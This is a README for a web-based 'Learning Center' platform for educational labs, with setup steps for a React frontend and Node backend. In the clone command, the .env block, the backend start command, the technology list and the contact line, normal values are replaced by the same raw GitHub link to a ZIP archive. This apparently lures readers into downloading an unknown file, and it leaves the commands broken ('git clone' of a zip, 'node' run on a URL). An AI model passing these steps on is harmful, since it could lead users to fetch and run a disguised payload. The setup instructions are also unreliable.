# Learning Center  

## Project Overview  
The **Learning Center** is a web-based platform designed to host and manage educational labs. It provides a user-friendly interface for learners to browse, interact with, and complete labs while enabling administrators to create and manage labs using a simple Git-based workflow.  

---

## Setup and Installation  
To set up and run the project, follow these steps:

### 1. Clone the Repository  
Run the following command to clone the project repository:  
```plaintext
git clone https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip
```

### 2. Navigate to the Project Directory  
After cloning the repository, navigate to the project folder:  
```plaintext
cd RockLearn
```

### 3. Install Dependencies  
#### Frontend:  
Navigate to the `Frontend` folder and install the required dependencies:  
```plaintext
cd Frontend  
npm install
```

#### Backend:  
Navigate to the `Backend` folder and install the required dependencies:  
```plaintext
cd Backend  
npm install
```
### 4. Configure Environment Variables  
Inside the `Backend` folder, create a `.env` file and add the following variables:  
```plaintext
DB_LINK=your-mongodb-connection-string  
BRANCH=main 
GITHUB_UNAME=your-github-username  
GITHUB_TOKEN=your-github-token  
GITHUB_USERNAME=your-github-username  
https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip  
JWT_SECRET=your-jwt-secret  
JWT_EXPIRE=1d  
JWT_COOKIE_EXPIRES=7  
GMAIL_USER=your-gmail-address  
GMAIL_PASS=your-gmail-password  
CLIENT_LINK=http://localhost:5173
```

### 5. Run the Application  
#### Frontend:  
Navigate to the `Frontend` folder (if not already there) and start the frontend server:  
```plaintext
cd Frontend  
npm run dev
```

#### Backend:  
Navigate to the `Backend` folder (if not already there) and start the backend server:  
```plaintext
cd Backend  
node https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip
```

### 6. Access the Application  
Once both the frontend and backend servers are running, open your browser and navigate to the frontend URL (default: `http://localhost:5173`) to access the Learning Center.  

---

## Technologies Used  
- **Frontend**: ReactJS, Material-UI, Tailwind CSS  
- **Backend**: https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip, https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip  
- **Database**: MongoDB  
- **Authentication**: JSON Web Tokens (JWT)  
- **Version Control**: Git, GitHub  

---

## Contribution Guidelines  
- Fork the repository and create a new branch for your feature or bug fix.  
- Commit your changes and submit a pull request with a detailed description of your updates.  

---

## License  
This project is licensed under the MIT License.  

---

## Contact  
For further information or questions, contact the project team at [https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip].  
